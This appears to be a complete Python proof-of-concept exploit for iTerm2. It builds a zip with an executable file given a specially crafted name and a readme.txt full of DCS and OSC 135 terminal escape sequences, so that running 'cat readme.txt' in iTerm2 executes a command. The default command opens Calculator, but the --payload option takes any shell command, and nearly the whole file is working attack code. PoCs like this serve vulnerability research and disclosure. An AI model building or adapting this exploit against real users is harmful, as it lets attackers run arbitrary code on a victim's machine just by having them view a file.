#!/usr/bin/env python3
import argparse, base64, io, os, stat, string, sys, zipfile

ESC, BEL, ST = "\x1b", "\x07", "\x1b\\"
_CHUNK = "ace/c+aliFIo"

def build_sshargs(name):
    c2 = len(name); tb = 128 + c2; raw = (tb // 4) * 3
    m = base64.b64decode(name); ms = m.decode("utf-8")
    pad = "A" * (raw - 4 - len(m))
    cmd = f"run {pad}{ms}"
    assert base64.b64encode(cmd.encode()).decode()[128:] == name
    return f"x {pad}{ms}"

def osc135(p): return f"{ESC}]135;:{p}{ST}".encode()

def build_dcs(sa):
    sb = base64.b64encode(sa.encode()).decode()
    tk, uid, bb = "00"*16, "poc-id", base64.b64encode(b"00").decode()
    return b"".join([
        f"{ESC}P2000p{tk} {uid} {bb} - {sb}\n".encode(),
        osc135("begin 90001"), osc135("/bin/sh\n/tmp\nsh"), osc135("end 90001 0 r"),
        osc135("begin 90002"), osc135("end 90002 1 r"),
        osc135("unhook")])

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--payload", default="open -a Calculator.app")
    ap.add_argument("-o", "--output", default="poc.zip")
    a = ap.parse_args()

    sa = build_sshargs(_CHUNK)
    catfile = b"# .\n" + build_dcs(sa) + b"\n"
    exploit = f"#!/bin/sh\n{a.payload}\n"

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        info = zipfile.ZipInfo(_CHUNK)
        info.external_attr = 0o755 << 16
        zf.writestr(info, exploit)
        zf.writestr("readme.txt", catfile)
    with open(a.output, "wb") as f:
        f.write(buf.getvalue())

    print(f"Created: {a.output}")
    print(f"  {_CHUNK}  -> #!/bin/sh; {a.payload}")
    print(f"  readme.txt -> trigger")
    print(f"\nIn iTerm2:")
    print(f"  unzip {a.output}")
    print(f"  cat readme.txt")
    print(f"\nExecutes: {a.payload}")

if __name__ == "__main__": main()
